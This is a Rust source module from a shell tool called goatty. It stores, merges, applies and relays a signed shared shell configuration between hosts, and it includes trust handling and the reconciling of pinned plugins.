//! The shared shell config on a host, and exchanging it (#313).
//!
//! The model and the merge are `goatty_config::shared`. This module is the
//! part that runs on a host and between hosts:
//!
//! * **Storage.** Each host keeps `shared.json` (the signed document) and
//!   `shared-trust.json` (the devices it trusts on its own authority) next
//!   to `host.json`.
//! * **Requests** ([`api`]): goattyd answers them over the protocol's
//!   `Shared` message (v18); `goatty --local` calls
//!   [`HostService::shared_request`] in-process.
//! * **Applying.** When the document changes and this host follows the
//!   shared config, the host resolves its settings, reconciles the shared
//!   plugins (installs what its registries vouch for, uninstalls what the
//!   shared config removed, reports the rest as needing review), builds a
//!   generation and reloads idle shells ([`HostService::apply_shared`]). No
//!   GUI needs to be attached.
//! * **Relaying** ([`exchange`]). Daemons never talk to each other. A client
//!   connected to several of them pulls from each what it lacks and pushes
//!   to each what it lacks, so a change spreads through any client that
//!   connects to two hosts.
//! * **Edits on the host itself** (`goattyd settings set`, an older GUI's
//!   `SetHostSettings`) on a host that follows become that host's
//!   overrides, signed by the host's own key ([`HostService::capture`]):
//!   they apply there, and a trusted GUI can share them or keep them.

use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;

use anyhow::{Context, Result, bail};
use goatty_config::shared::{self, Entry, Hlc, Key, PluginPin, Roots, SharedDoc, Signer, Trust, VersionVector};
use goatty_config::{HostSettings, store};
use goatty_plugin::api as plugin_api;
use serde::{Deserialize, Serialize};

use crate::service::HostService;

/// Requests and replies, as JSON over the protocol's `Shared` message.
pub mod api {
    use goatty_config::shared::{Entry, VersionVector};
    use serde::{Deserialize, Serialize};

    #[derive(Debug, Clone, Serialize, Deserialize)]
    #[serde(tag = "op", rename_all = "snake_case")]
    pub enum Request {
        /// What this host has and decides ([`Status`]).
        Status,
        /// The entries newer than `have` (what the client lacks).
        Pull { have: VersionVector },
        /// Merge `entries`; when that changed something and this host
        /// follows the shared config, apply it before replying.
        Push { entries: Vec<Entry> },
        /// Trust `device` on this host (the connecting client's own device:
        /// whoever can connect to goattyd can already run commands here).
        Trust { device: String, name: String },
        /// Resolve and apply the shared config now.
        Apply,
    }

    #[derive(Debug, Clone, Serialize, Deserialize)]
    #[serde(tag = "kind", rename_all = "snake_case")]
    pub enum Reply {
        Status(Box<Status>),
        /// One page of what the client lacks (oldest first per device);
        /// `more`: pull again with the new version vector for the rest.
        Entries {
            entries: Vec<Entry>,
            have: VersionVector,
            #[serde(default)]
            more: bool,
        },
        Done,
    }

    /// How much entry JSON one `Pull` reply or `Push` request carries at
    /// most (a frame is at most 64 MiB).
    pub const PAGE_BYTES: usize = 16 << 20;

    /// A host's view of the shared config.
    #[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
    pub struct Status {
        /// This host's id (its device key).
        pub host: String,
        /// Its host name.
        pub name: String,
        /// What its document holds.
        pub have: VersionVector,
        pub entries: usize,
        /// Whether it follows the shared config (`None`: never decided).
        pub member: Option<bool>,
        /// Its trust roots, and every device it trusts.
        pub roots: Vec<String>,
        pub trusted: Vec<String>,
        /// Devices whose entries don't count here.
        pub untrusted: Vec<Untrusted>,
        /// Its own overrides only it signed (made there without a GUI).
        pub local_changes: Vec<String>,
        /// Shared plugins it couldn't install without another review.
        pub needs_review: Vec<Review>,
        /// The last time it applied the shared config.
        pub last_apply: Option<Applied>,
    }

    #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
    pub struct Untrusted {
        pub device: String,
        pub name: Option<String>,
        pub entries: usize,
    }

    #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
    pub struct Review {
        pub id: String,
        pub reason: String,
    }

    #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
    pub struct Applied {
        pub unix: u64,
        pub ok: bool,
        /// What changed, or what went wrong.
        pub lines: Vec<String>,
        pub generation: Option<u32>,
        /// The shell configuration changed (shells were asked to reload).
        pub changed: bool,
    }
}

use api::{Applied, Review, Status, Untrusted};

/// The source of plugins installed from a directory.
const LOCAL_SOURCE: &str = "local";

/// This machine's device key as a [`Signer`].
pub struct Device {
    id: goatty_net::identity::Identity,
    pub name: String,
}

impl Signer for Device {
    fn device(&self) -> String {
        self.id.public()
    }

    fn sign(&self, msg: &[u8]) -> String {
        self.id.sign(msg)
    }
}

impl Device {
    /// The key in goatty's data dir (made on first use; the same key the
    /// tailnet uses).
    pub fn load(dirs: &crate::Dirs) -> Result<Device> {
        let paths = goatty_net::Paths::new(dirs.tailnet_dir());
        let id = goatty_net::identity::Identity::load_or_create(&paths.key())?;
        Ok(Device { id, name: hostname() })
    }
}

/// This computer's host name (empty when unknown).
pub fn hostname() -> String {
    #[cfg(unix)]
    {
        let mut buf = [0u8; 256];
        // SAFETY: `buf` is valid for writes of the length passed.
        let ok = unsafe { libc::gethostname(buf.as_mut_ptr().cast(), buf.len()) } == 0;
        if ok {
            let end = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
            let name = String::from_utf8_lossy(&buf[..end]).trim().to_owned();
            if !name.is_empty() {
                return name;
            }
        }
        std::fs::read_to_string("/etc/hostname").map(|s| s.trim().to_owned()).unwrap_or_default()
    }
    #[cfg(not(unix))]
    {
        std::env::var("COMPUTERNAME").unwrap_or_default()
    }
}

/// Where a host keeps the shared config: next to `host.json`.
#[derive(Debug, Clone)]
pub struct Files {
    pub doc: PathBuf,
    pub roots: PathBuf,
}

impl Files {
    pub fn next_to(host_file: &std::path::Path) -> Files {
        Files { doc: host_file.with_file_name("shared.json"), roots: host_file.with_file_name("shared-trust.json") }
    }
}

/// What a host's apply did, kept for [`Status::last_apply`].
#[derive(Debug, Default)]
pub struct State {
    pub last_apply: Option<Applied>,
    pub needs_review: Vec<Review>,
    /// The last apply didn't complete: the next push applies again even
    /// when it brings nothing new.
    pub retry: bool,
}

/// What reconciling the shared plugins did.
#[derive(Debug, Default)]
struct Reconciled {
    lines: Vec<String>,
    review: Vec<Review>,
    /// Something went wrong (not just "needs review").
    failed: bool,
    /// The shell configuration changed (shells should reload).
    reload: bool,
}

fn now_unix() -> u64 {
    std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

impl HostService {
    fn shared_files(&self) -> Result<Files> {
        let host_file = self.host_file.as_deref().context("no $HOME on this host: nowhere to keep the shared config")?;
        Ok(Files::next_to(host_file))
    }

    /// This host's device key.
    pub fn device(&self) -> Result<Device> {
        let dirs = self.launcher.dirs().context("no $HOME on this host")?;
        Device::load(dirs)
    }

    /// The document, the trust roots and what they make trusted.
    pub fn shared_doc(&self) -> Result<(SharedDoc, Roots, Trust)> {
        let files = self.shared_files()?;
        let doc = SharedDoc::load(&files.doc);
        let roots = Roots::load(&files.roots);
        let trust = doc.trust(&roots.devices());
        Ok((doc, roots, trust))
    }

    /// Answer a shared-config request (the protocol's `Shared` message).
    /// A push that changes something is applied before the reply: call off
    /// the UI thread.
    pub fn shared_request(&self, req: api::Request) -> Result<api::Reply> {
        match req {
            api::Request::Status => Ok(api::Reply::Status(Box::new(self.shared_status()?))),
            api::Request::Pull { have } => {
                let (doc, ..) = self.shared_doc()?;
                let (entries, more) = doc.newer_than_page(&have, api::PAGE_BYTES);
                Ok(api::Reply::Entries { entries, have: doc.version(), more })
            }
            api::Request::Push { entries } => {
                let retry = self.shared_state.lock().unwrap_or_else(|e| e.into_inner()).retry;
                if self.merge_shared(entries)? > 0 || retry {
                    self.apply_shared();
                }
                Ok(api::Reply::Status(Box::new(self.shared_status()?)))
            }
            api::Request::Trust { device, name } => {
                if !shared::is_device_id(&device) {
                    bail!("not a device key: {device:?}");
                }
                let files = self.shared_files()?;
                let _guard = self.shared_lock()?;
                let mut roots = Roots::load(&files.roots);
                if roots.add(&device, &name) {
                    roots.save(&files.roots).with_context(|| format!("save {}", files.roots.display()))?;
                    log::info!("shared config: trusting {} ({})", shared::short_id(&device), name);
                    drop(_guard);
                    // Its entries may count now.
                    self.apply_shared();
                }
                Ok(api::Reply::Done)
            }
            api::Request::Apply => {
                self.apply_shared();
                Ok(api::Reply::Status(Box::new(self.shared_status()?)))
            }
        }
    }

    /// Merge entries into `shared.json`. Returns how many changed it.
    pub fn merge_shared(&self, entries: Vec<Entry>) -> Result<usize> {
        if entries.is_empty() {
            return Ok(0);
        }
        let files = self.shared_files()?;
        let _guard = self.shared_lock()?;
        let mut doc = SharedDoc::load(&files.doc);
        let trust = doc.trust(&Roots::load(&files.roots).devices());
        let own = self.device().ok().map(|d| d.device());
        let n = doc.merge_trusted(entries, &trust, own.as_deref());
        if n > 0 {
            doc.save(&files.doc).with_context(|| format!("save {}", files.doc.display()))?;
        }
        Ok(n)
    }

    pub fn shared_status(&self) -> Result<Status> {
        let (doc, roots, trust) = self.shared_doc()?;
        let host = self.device()?.device();
        let untrusted = doc
            .untrusted(&trust)
            .into_iter()
            .map(|(device, entries)| Untrusted { name: doc.name(&device, &trust), device, entries })
            .collect();
        let state = self.shared_state.lock().unwrap_or_else(|e| e.into_inner());
        Ok(Status {
            member: doc.member(&host, &trust),
            local_changes: doc.local_changes(&host, &trust),
            name: hostname(),
            host,
            have: doc.version(),
            entries: doc.len(),
            roots: roots.devices().into_iter().collect(),
            trusted: trust.devices.into_iter().collect(),
            untrusted,
            needs_review: state.needs_review.clone(),
            last_apply: state.last_apply.clone(),
        })
    }

    /// Apply the shared config if this host follows it: plugins first (an
    /// install switches its plugin on), then the settings as one generation,
    /// then a reload of idle shells. The outcome goes to
    /// [`Status::last_apply`]; nothing here fails the request that caused it.
    ///
    /// The whole apply holds the shared-files lock (also against goattyd's
    /// CLI in another process), so an older document can't be committed
    /// after a newer one.
    pub fn apply_shared(&self) -> Option<Applied> {
        let _guard = self.shared_apply.lock().unwrap_or_else(|e| e.into_inner());
        let outcome = match self.shared_lock().and_then(|_files| self.apply_shared_inner()) {
            Ok(None) => return None,
            Ok(Some(a)) => a,
            Err(e) => {
                log::warn!("couldn't apply the shared config: {e:#}");
                Applied { unix: now_unix(), ok: false, lines: vec![format!("{e:#}")], generation: self.active_generation(), changed: false }
            }
        };
        let mut state = self.shared_state.lock().unwrap_or_else(|e| e.into_inner());
        state.retry = !outcome.ok;
        state.last_apply = Some(outcome.clone());
        Some(outcome)
    }

    fn apply_shared_inner(&self) -> Result<Option<Applied>> {
        let (doc, _, trust) = self.shared_doc()?;
        let host = self.device()?.device();
        if doc.member(&host, &trust) != Some(true) {
            return Ok(None);
        }
        let r = self.reconcile_plugins(&doc, &trust);
        let mut lines = r.lines;
        self.shared_state.lock().unwrap_or_else(|e| e.into_inner()).needs_review = r.review;

        let applied_path = self.launcher.dirs().map(crate::Dirs::shared_applied);
        let prev_applied = applied_path.as_deref().and_then(load_applied_state);
        let (overridden, next_applied) = find_overridden(&doc, &trust, &host, prev_applied.as_ref());

        let current = self.settings().file;
        let mut resolved = doc.resolve(Some(&host), &trust, &current.value).value;
        keep_host_only_plugins(&doc, &trust, &host, &current.value, &mut resolved);
        // An install or uninstall may have built a generation already.
        let mut changed = r.reload;
        let mut ok = !r.failed;
        if resolved != current.value {
            let before = current.value.clone();
            match self.set(&store::to_json(&resolved, &current.unknown), true) {
                Ok(o) if o.applied => {
                    changed |= !o.diff.is_empty();
                    let n = shared::changes(&before, &resolved).len();
                    lines.push(format!("applied {n} setting change(s) from the shared config"));
                    lines.extend(o.issues.iter().map(|i| format!("⚠ {i}")));
                }
                Ok(o) => {
                    ok = false;
                    lines.push("the shared settings weren't applied".into());
                    lines.extend(o.issues);
                }
                Err(e) => {
                    ok = false;
                    lines.push(format!("the shared settings don't build here: {e:#}"));
                }
            }
        }
        if ok {
            if !overridden.is_empty() {
                if self.active_generation().is_none()
                    && let Err(e) = self.launcher.apply(&self.settings())
                {
                    log::warn!("couldn't build a generation to record overridden shared values: {e:#}");
                }
                if let (Some(dirs), Some(gen_num)) = (self.launcher.dirs(), self.active_generation()) {
                    match crate::history::record_overridden(dirs, gen_num, &overridden) {
                        Ok(()) => {
                            lines.push(format!("kept {} overridden value(s) from other devices in generation {gen_num}", overridden.len()));
                        }
                        Err(e) => log::warn!("couldn't record overridden shared values in generation {gen_num}: {e:#}"),
                    }
                }
            }
            if let Some(path) = &applied_path
                && let Err(e) = save_applied_state(path, &next_applied)
            {
                log::warn!("couldn't save {}: {e:#}", path.display());
            }
        }
        if changed && let Err(e) = self.reload_shells() {
            log::info!("couldn't reload shells after the shared config changed: {e:#}");
        }
        for l in &lines {
            log::info!("shared config: {l}");
        }
        Ok(Some(Applied { unix: now_unix(), ok, lines, generation: self.active_generation(), changed }))
    }

    /// Install or update the shared plugins this host's registries vouch
    /// for, and uninstall the ones the shared config removed. Returns what
    /// happened and what needs a review on this host.
    fn reconcile_plugins(&self, doc: &SharedDoc, trust: &Trust) -> Reconciled {
        let mut out = Reconciled::default();
        let pins = doc.plugins(trust);
        let removed = doc.removed_plugins(trust);
        if pins.is_empty() && removed.is_empty() {
            return out;
        }
        let catalog = match self.plugin_request(plugin_api::Request::Catalog { refresh: false }) {
            Ok(plugin_api::Reply::Catalog(c)) => c,
            Ok(other) => {
                out.failed = true;
                out.lines.push(format!("unexpected plugin reply {other:?}"));
                return out;
            }
            Err(e) => {
                out.failed = true;
                out.lines.push(format!("couldn't read the plugins here: {e:#}"));
                return out;
            }
        };
        let installed: BTreeMap<&str, &plugin_api::Installed> =
            catalog.installed.iter().filter(|i| !i.builtin).map(|i| (i.id.as_str(), i)).collect();
        for (id, pin) in &pins {
            if let Some(i) = installed.get(id.as_str()) {
                if i.source != pin.registry {
                    // Not the plugin the shared config means: don't replace it unasked.
                    let reason = format!("installed here from {}; the shared config has it from {}", i.source, pin.registry);
                    out.review.push(Review { id: id.clone(), reason });
                    continue;
                }
                if i.version == pin.version || crate::plugins::newer(&i.version, &pin.version) {
                    continue;
                }
            }
            if let Err(reason) = registry_vouches(&catalog, pin) {
                out.review.push(Review { id: id.clone(), reason });
                continue;
            }
            match self.install_pinned(id, pin) {
                Ok(c) => {
                    out.reload |= c.reload;
                    out.lines.push(c.lines.first().cloned().unwrap_or_else(|| format!("installed {id} {}", pin.version)));
                }
                // Not the plugin that was approved: a person has to look.
                Err(Install::Review(reason)) => out.review.push(Review { id: id.clone(), reason }),
                // A download or the host's plugin store failed: the next exchange tries again.
                Err(Install::Failed(e)) => {
                    out.failed = true;
                    out.lines.push(format!("couldn't install {id} {}: {e:#}", pin.version));
                }
            }
        }
        for id in removed {
            let Some(i) = installed.get(id.as_str()) else { continue };
            if i.source == LOCAL_SOURCE {
                continue;
            }
            match self.uninstall_plugin(&id) {
                Ok(c) => {
                    out.reload |= c.reload;
                    out.lines.push(format!("uninstalled {id} (removed from the shared config)"));
                }
                Err(e) => {
                    out.failed = true;
                    out.lines.push(format!("couldn't uninstall {id}: {e:#}"));
                }
            }
        }
        out
    }

    /// Install `id` at the pinned version, if this host's plan is exactly
    /// that plugin (same signed registry and version, nothing else needed).
    fn install_pinned(&self, id: &str, pin: &PluginPin) -> Result<plugin_api::Changed, Install> {
        let plan = |refresh: bool| -> Result<plugin_api::Plan> {
            if refresh {
                self.plugin_request(plugin_api::Request::Catalog { refresh: true })?;
            }
            match self.plugin_request(plugin_api::Request::Plan { id: id.to_owned(), version: Some(pin.version.clone()) })? {
                plugin_api::Reply::Plan(p) => Ok(*p),
                other => bail!("unexpected plugin reply {other:?}"),
            }
        };
        let plan = plan(false).or_else(|_| plan(true)).map_err(Install::Failed)?;
        let step = crate::sync::PluginStep {
            id: id.to_owned(),
            name: plan.name.clone(),
            version: pin.version.clone(),
            registry: pin.registry.clone(),
            replaces: None,
        };
        crate::sync::check_plan(&step, &plan).map_err(|e| Install::Review(format!("{e:#}")))?;
        match self.plugin_request(plugin_api::Request::Install { id: plan.id, version: Some(plan.version), approved: plan.digest }) {
            Ok(plugin_api::Reply::Changed(c)) => Ok(c),
            Ok(other) => Err(Install::Failed(anyhow::anyhow!("unexpected plugin reply {other:?}"))),
            Err(e) => Err(Install::Failed(e)),
        }
    }

    /// Turn a direct edit of a following host's settings (`before` → the
    /// settings now stored) into overrides signed by this host, so the next
    /// apply keeps them. Machine-only values aren't touched. Does nothing
    /// on a host that doesn't follow the shared config.
    ///
    /// `after` is what the edit committed (not a later read, which could
    /// include a shared apply that ran in between).
    pub fn capture(&self, before: &HostSettings, after: &HostSettings) -> Result<usize> {
        let (doc, _, trust) = self.shared_doc()?;
        let device = self.device()?;
        let host = device.device();
        if doc.member(&host, &trust) != Some(true) {
            return Ok(0);
        }
        let existing = doc.overrides(&host, &trust);
        let entries: Vec<Entry> = shared::override_entries(&doc, &trust, &host, before, after, doc.next_hlc(), &device)
            .into_iter()
            // Removing an override that isn't there changes nothing.
            .filter(|e| !e.deleted || matches!(e.parsed_key(), Some(Key::Override { path, .. }) if existing.contains_key(&path)))
            .collect();
        let n = self.merge_shared(entries)?;
        if n > 0 {
            log::info!("shared config: kept {n} change(s) made on this host as its overrides");
        }
        Ok(n)
    }

    /// [`set`](Self::set), keeping the change on a host that follows the
    /// shared config (as its overrides, [`capture`](Self::capture)).
    ///
    /// When the edit is saved but can't be kept in the shared config, the
    /// outcome says so (the next shared update may undo it).
    pub fn set_captured(&self, json: &str, apply: bool) -> Result<crate::service::ApplyOutcome> {
        let before = self.settings().file.value;
        let mut outcome = self.set(json, apply)?;
        if apply
            && outcome.applied
            && let Err(e) = self.capture(&before, &store::parse::<HostSettings>(json).value)
        {
            log::warn!("couldn't keep the change in the shared config: {e:#}");
            outcome.issues.push(format!(
                "saved on this host, but couldn't keep it as this host's override in the shared config ({e:#}); the next shared update may undo it"
            ));
        }
        Ok(outcome)
    }

    /// Sign entries as this host and merge them (`goattyd settings set
    /// --shared`), then apply.
    pub fn publish(&self, make: impl FnOnce(&SharedDoc, &Trust, Hlc, &Device) -> Vec<Entry>) -> Result<usize> {
        let (doc, _, trust) = self.shared_doc()?;
        let device = self.device()?;
        let entries = make(&doc, &trust, doc.next_hlc(), &device);
        let n = self.merge_shared(entries)?;
        if n > 0 {
            self.apply_shared();
        }
        Ok(n)
    }

    /// One change to the shared files at a time: in this process, and
    /// against goattyd's CLI in another (`shared.lock`).
    fn shared_lock(&self) -> Result<SharedGuard<'_>> {
        let mutex = self.shared_files_lock.lock().unwrap_or_else(|e| e.into_inner());
        let path = self.shared_files()?.doc.with_file_name("shared.lock");
        if let Some(dir) = path.parent() {
            std::fs::create_dir_all(dir).with_context(|| format!("create {}", dir.display()))?;
        }
        let file = std::fs::OpenOptions::new()
            .create(true)
            .truncate(false)
            .write(true)
            .open(&path)
            .with_context(|| format!("open {}", path.display()))?;
        file.lock().with_context(|| format!("lock {}", path.display()))?;
        Ok(SharedGuard { _mutex: mutex, _file: file })
    }
}

/// Why a shared plugin wasn't installed.
enum Install {
    /// The host offers something else than what was approved.
    Review(String),
    /// Something went wrong on the way (worth another try).
    Failed(anyhow::Error),
}

/// Held while changing the shared files (the file lock goes with the file).
struct SharedGuard<'a> {
    _mutex: std::sync::MutexGuard<'a, ()>,
    _file: std::fs::File,
}

/// Bookkeeping of what this host last applied from the shared config, so
/// values from other devices that lost a concurrent edit can be recorded
/// once in the generation history (#323). Local to this host; never synced.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
struct AppliedState {
    /// Newest accepted clock per device as of the last apply.
    #[serde(default)]
    seen: VersionVector,
    /// Winning `(hlc, device)` per deciding key (`set/…`, `host/<this>/…`, `plugin/…`).
    #[serde(default)]
    winners: BTreeMap<String, (Hlc, String)>,
}

fn load_applied_state(path: &std::path::Path) -> Option<AppliedState> {
    std::fs::read_to_string(path).ok().and_then(|s| serde_json::from_str(&s).ok())
}

fn save_applied_state(path: &std::path::Path, state: &AppliedState) -> Result<()> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)?;
    }
    let mut text = serde_json::to_string_pretty(state)?;
    text.push('\n');
    store::write_text(path, &text).map(drop).with_context(|| format!("write {}", path.display()))
}

/// Find shared-config values from other devices that lost to the winning
/// entry for this apply (#323), together with the new [`AppliedState`] to
/// record once the apply succeeds.
///
/// On a host's very first apply (`prev` is `None`, e.g. a new machine
/// joining an existing setup), no historical losers are emitted so months
/// of old edits aren't dumped into its first generation.
fn find_overridden(
    doc: &SharedDoc,
    trust: &Trust,
    host: &str,
    prev: Option<&AppliedState>,
) -> (Vec<crate::history::Overridden>, AppliedState) {
    let mut seen = VersionVector::new();
    let mut all_keys = BTreeSet::new();
    for e in doc.entries() {
        all_keys.insert(e.key.as_str());
        if trust.accepts(e) {
            let t = seen.entry(e.device.clone()).or_default();
            *t = (*t).max(e.hlc);
        }
    }

    let mut overridden_paths = BTreeSet::new();
    let mut deciding: Vec<(String, &Entry)> = Vec::new();
    for &key in &all_keys {
        if let Some(Key::Override { host: h, path }) = Key::parse(key)
            && h == host
            && HostSettings::scope(&path) == shared::Scope::Shared
            && let Some(w) = doc.winner(key, trust)
        {
            if !w.deleted {
                overridden_paths.insert(path);
            }
            deciding.push((key.to_owned(), w));
        }
    }
    for &key in &all_keys {
        match Key::parse(key) {
            Some(Key::Setting(path)) if HostSettings::scope(&path) == shared::Scope::Shared && !overridden_paths.contains(&path) => {
                if let Some(w) = doc.winner(key, trust) {
                    deciding.push((key.to_owned(), w));
                }
            }
            Some(Key::Plugin(_)) => {
                if let Some(w) = doc.winner(key, trust) {
                    deciding.push((key.to_owned(), w));
                }
            }
            _ => {}
        }
    }
    deciding.sort_by(|(a, _), (b, _)| a.cmp(b));

    let winners: BTreeMap<String, (Hlc, String)> = deciding.iter().map(|(k, w)| (k.clone(), (w.hlc, w.device.clone()))).collect();
    let next = AppliedState { seen, winners };

    let Some(prev) = prev else {
        return (Vec::new(), next);
    };

    let mut out = Vec::new();
    for (key, winner) in deciding {
        let mut losers: Vec<&Entry> = doc
            .all_for(&key)
            .filter(|e| trust.accepts(e) && e.device != winner.device && e.value() != winner.value())
            .filter(|e| {
                let newly_accepted = prev.seen.get(&e.device).is_none_or(|t| e.hlc > *t);
                let replaced_prev_winner =
                    winner.device != host && prev.winners.get(&key).is_some_and(|(hlc, dev)| *hlc == e.hlc && dev == &e.device);
                newly_accepted || replaced_prev_winner
            })
            .collect();
        losers.sort_by(|a, b| (b.hlc, &b.device).cmp(&(a.hlc, &a.device)));
        for e in losers {
            out.push(crate::history::Overridden {
                key: key.clone(),
                value: e.value().cloned(),
                device: e.device.clone(),
                device_name: doc.name(&e.device, trust),
                hlc: e.hlc,
            });
        }
    }
    (out, next)
}

/// The host's registry named like the pin's vouches for it the way the
/// device that added it did: the same key, or goatty's built-in one on both.
fn registry_vouches(catalog: &plugin_api::Catalog, pin: &PluginPin) -> Result<(), String> {
    let Some(r) = catalog.registries.iter().find(|r| r.name == pin.registry) else {
        return Err(format!("this host doesn't use the {} registry (add it with `goattyd plugin registry add`)", pin.registry));
    };
    if (r.builtin && pin.builtin) || r.keys.iter().any(|k| pin.keys.contains(k)) {
        Ok(())
    } else {
        Err(format!("the {} registry here isn't signed by a key the shared config trusts; review it on this host", pin.registry))
    }
}

/// Plugins the shared config doesn't mention keep this host's entries
/// (a plugin only this host has, installed from a folder).
///
/// Only entries that count for this host mention a plugin (the same rule
/// [`SharedDoc::resolve`] uses): trusted ones, and overrides of this host.
fn keep_host_only_plugins(doc: &SharedDoc, trust: &Trust, host: &str, current: &HostSettings, resolved: &mut HostSettings) {
    let mentioned: BTreeSet<String> = doc
        .entries()
        .filter(|e| trust.accepts(e))
        .filter_map(|e| match e.parsed_key()? {
            Key::Plugin(id) => Some(id),
            Key::Override { host: h, .. } if h != host => None,
            Key::Setting(p) | Key::Override { path: p, .. } => {
                let segs = shared::split_path(&p);
                (segs.first().map(String::as_str) == Some("plugins")).then(|| segs.get(1).cloned()).flatten()
            }
            _ => None,
        })
        .collect();
    for (id, cfg) in &current.plugins {
        if !mentioned.contains(id) {
            resolved.plugins.insert(id.clone(), cfg.clone());
        }
    }
}

/// The registry plugins in a host's plugin catalog as the shared config
/// pins them (signed registry plugins; not built-in or folder ones).
pub fn pins_from_catalog(catalog: &plugin_api::Catalog) -> BTreeMap<String, PluginPin> {
    catalog
        .installed
        .iter()
        .filter(|i| !i.builtin && i.source != LOCAL_SOURCE && i.verified)
        .filter_map(|i| {
            let r = catalog.registries.iter().find(|r| r.name == i.source)?;
            Some((
                i.id.clone(),
                PluginPin { version: i.version.clone(), registry: i.source.clone(), keys: r.keys.clone(), builtin: r.builtin },
            ))
        })
        .collect()
}

/// The registry plugins installed on a machine as the shared config pins
/// them (for seeding it, and for sharing an install).
pub fn pins(svc: &HostService) -> Result<BTreeMap<String, PluginPin>> {
    let local = crate::sync::LocalSetup::read(svc)?;
    Ok(local
        .plugins
        .iter()
        .filter(|p| p.source != LOCAL_SOURCE)
        .filter_map(|p| {
            let r = local.registries.iter().find(|r| r.name == p.source)?;
            Some((
                p.id.clone(),
                PluginPin { version: p.version.clone(), registry: p.source.clone(), keys: r.keys.clone(), builtin: r.builtin },
            ))
        })
        .collect())
}

// ---- Relaying between hosts (client side) ------------------------------------------------

/// A host's goattyd as an exchange reaches it.
pub trait Peer {
    /// For logs and messages.
    fn label(&self) -> String;
    fn shared(&self, req: api::Request) -> Result<api::Reply>;
}

impl Peer for HostService {
    fn label(&self) -> String {
        "this computer".into()
    }

    fn shared(&self, req: api::Request) -> Result<api::Reply> {
        self.shared_request(req)
    }
}

/// `Status` from a peer.
pub fn status(peer: &dyn Peer) -> Result<Status> {
    match peer.shared(api::Request::Status)? {
        api::Reply::Status(s) => Ok(*s),
        other => bail!("unexpected reply from {}: {other:?}", peer.label()),
    }
}

/// What one exchange found.
#[derive(Debug, Default)]
pub struct Exchange {
    /// Everything the reachable peers hold, merged (plus `extra`).
    pub doc: SharedDoc,
    /// Each peer's status after the exchange (`None`: it failed; see
    /// `errors`), in the order given.
    pub statuses: Vec<Option<Status>>,
    pub errors: Vec<(usize, String)>,
    /// How many entries were pushed to each peer.
    pub pushed: Vec<usize>,
}

impl Exchange {
    /// The trust a peer computes, rebuilt here from its roots.
    pub fn trust_of(&self, i: usize) -> Trust {
        let roots: BTreeSet<String> =
            self.statuses.get(i).and_then(|s| s.as_ref()).map(|s| s.roots.iter().cloned().collect()).unwrap_or_default();
        self.doc.trust(&roots)
    }
}

/// Exchange the shared config between `peers` (and add `extra`, entries
/// this device just signed): each peer first trusts `me` (the connection
/// is the user's), then everything is pulled into one document, and each
/// peer gets what it lacks (and applies it). Blocks: off the UI thread.
pub fn exchange(peers: &[&dyn Peer], me: &Device, extra: Vec<Entry>) -> Exchange {
    let mut out = Exchange { statuses: vec![None; peers.len()], pushed: vec![0; peers.len()], ..Exchange::default() };
    let mut have: Vec<Option<VersionVector>> = vec![None; peers.len()];
    for (i, p) in peers.iter().enumerate() {
        let r = p.shared(api::Request::Trust { device: me.device(), name: me.name.clone() }).and_then(|_| status(*p)).and_then(|s| {
            // Page by page: each pull asks for what's still missing.
            let mut pulled = SharedDoc::default();
            for _ in 0..10_000 {
                let mut have = out.doc.version();
                for (d, t) in pulled.version() {
                    let e = have.entry(d).or_default();
                    *e = (*e).max(t);
                }
                match p.shared(api::Request::Pull { have })? {
                    api::Reply::Entries { entries, more, .. } => {
                        let added = pulled.merge(entries);
                        if !more {
                            break;
                        }
                        if added == 0 {
                            bail!("{} keeps sending entries this computer already has (or refuses)", p.label());
                        }
                    }
                    other => bail!("unexpected reply {other:?}"),
                }
            }
            Ok((s, pulled))
        });
        match r {
            Ok((s, pulled)) => {
                out.doc.merge(pulled.entries().cloned());
                have[i] = Some(s.have.clone());
                out.statuses[i] = Some(s);
            }
            Err(e) => out.errors.push((i, format!("{e:#}"))),
        }
    }
    out.doc.merge(extra);
    for (i, p) in peers.iter().enumerate() {
        let Some(h) = &have[i] else { continue };
        let missing = out.doc.newer_than(h);
        if missing.is_empty() {
            // Nothing new, but its last apply failed: an empty push makes it try again.
            if out.statuses[i].as_ref().and_then(|s| s.last_apply.as_ref()).is_some_and(|a| !a.ok) {
                match p.shared(api::Request::Push { entries: Vec::new() }) {
                    Ok(api::Reply::Status(s)) => out.statuses[i] = Some(*s),
                    Ok(other) => out.errors.push((i, format!("unexpected reply {other:?}"))),
                    Err(e) => out.errors.push((i, format!("{e:#}"))),
                }
            }
            continue;
        }
        out.pushed[i] = missing.len();
        for chunk in shared::pages(missing, api::PAGE_BYTES) {
            match p.shared(api::Request::Push { entries: chunk }) {
                Ok(api::Reply::Status(s)) => out.statuses[i] = Some(*s),
                Ok(other) => {
                    out.errors.push((i, format!("unexpected reply {other:?}")));
                    break;
                }
                Err(e) => {
                    out.errors.push((i, format!("{e:#}")));
                    break;
                }
            }
        }
    }
    out
}

// ---- Decisions a GUI (or `goatty sync`) signs ----------------------------------------------

/// Host `host` follows the shared config from now on, named `name`. With
/// `own` (its settings so far) its differences are kept as its overrides.
pub fn join_entries(doc: &SharedDoc, trust: &Trust, host: &str, name: &str, own: Option<&HostSettings>, me: &Device) -> Vec<Entry> {
    let hlc = doc.next_hlc();
    let mut out = vec![Entry::new(&Key::Member(host.to_owned()), Some(true.into()), hlc, me)];
    if !name.is_empty() {
        out.push(Entry::new(&Key::Name(host.to_owned()), Some(name.into()), shared::bump(hlc, 1), me));
    }
    if let Some(own) = own {
        out.extend(shared::keep_as_overrides(doc, trust, host, own, shared::bump(hlc, 2), me));
    }
    out
}

/// Host `host` keeps its own settings ("Keep separate").
pub fn leave_entries(doc: &SharedDoc, host: &str, name: &str, me: &Device) -> Vec<Entry> {
    let hlc = doc.next_hlc();
    let mut out = vec![Entry::new(&Key::Member(host.to_owned()), Some(false.into()), hlc, me)];
    if !name.is_empty() {
        out.push(Entry::new(&Key::Name(host.to_owned()), Some(name.into()), shared::bump(hlc, 1), me));
    }
    out
}

